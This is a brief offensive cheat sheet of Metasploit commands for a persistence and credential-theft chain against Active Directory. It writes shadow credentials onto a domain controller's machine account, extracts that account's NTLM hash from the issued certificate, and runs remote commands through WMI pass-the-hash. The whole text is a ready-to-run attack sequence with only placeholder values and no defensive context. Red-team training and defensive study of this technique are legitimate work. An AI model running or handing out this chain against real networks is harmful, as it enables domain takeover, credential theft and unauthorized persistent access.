# Metasploit - AD Persistence

### 1) Shadow Credentials

    use auxiliary/admin/ldap/shadow_credentials

Execution

    set rhosts IP
    set username USER
    set password PASSWORD
    set domain domain.local
    set target_user dc01$
    set rport 636
    set ssl true
    set action add
    run

#### Extract NTLM hash from the Certificate

    use auxiliary/admin/kerberos/get_ticket

Execution

    set rhosts IP
    set action GET_HASH
    set domain domain.local
    set username dc01$
    set cert_file /root/.msf4/loot/DATE_default_IP_windows.ad.cs_NUM.pfx
    run

#### Run commands via WMI Pass-the-Hash

    use auxiliary/scanner/smb/impacket/wmiexec

Execution

    set command ipconfig
    set hashes LM_HASH:NTLM_HASH
    set rhosts IP
    set smbuser USER
    run

    
